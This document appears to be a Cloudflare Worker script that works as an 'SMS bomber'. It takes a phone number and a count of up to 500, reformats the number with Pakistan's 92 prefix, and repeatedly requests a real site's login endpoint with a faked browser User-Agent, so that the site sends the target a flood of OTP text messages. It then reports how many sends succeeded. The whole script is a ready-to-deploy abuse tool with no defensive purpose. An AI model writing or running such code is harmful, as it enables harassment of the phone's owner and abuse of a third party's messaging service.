addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const phone = url.searchParams.get('phone')
  const qty = parseInt(url.searchParams.get('qty')) || 1
  
  // Validate
  if (!phone) {
    return new Response('Error: Phone number required\nExample: /?phone=03271234567&qty=10', { 
      status: 400,
      headers: { 'Content-Type': 'text/plain' }
    })
  }
  
  if (qty > 500) {
    return new Response('Error: Max 500 messages allowed', { 
      status: 400,
      headers: { 'Content-Type': 'text/plain' }
    })
  }
  
  try {
    // Format phone
    let cleanPhone = phone.replace(/\D/g, '')
    
    if (cleanPhone.startsWith('0')) {
      cleanPhone = '92' + cleanPhone.substring(1)
    } else if (cleanPhone.length === 10) {
      cleanPhone = '92' + cleanPhone
    }
    
    // Send OTPs
    let successful = 0
    let failed = 0
    
    for (let i = 0; i < qty; i++) {
      try {
        const response = await fetch(`https://deikho.com/login?phone=${cleanPhone}`, {
          headers: {
            'User-Agent': 'Mozilla/5.0'
          }
        })
        
        if (response.ok) {
          successful++
        } else {
          failed++
        }
      } catch {
        failed++
      }
      
      // Small delay
      if (i < qty - 1) {
        await new Promise(resolve => setTimeout(resolve, 100))
      }
    }
    
    // Simple response
    return new Response(JSON.stringify({
      sent: successful,
      failed: failed,
      total: qty,
      phone: cleanPhone
    }), {
      headers: { 'Content-Type': 'application/json' }
    })
    
  } catch (error) {
    return new Response('Error: ' + error.message, { 
      status: 500,
      headers: { 'Content-Type': 'text/plain' }
    })
  }
}
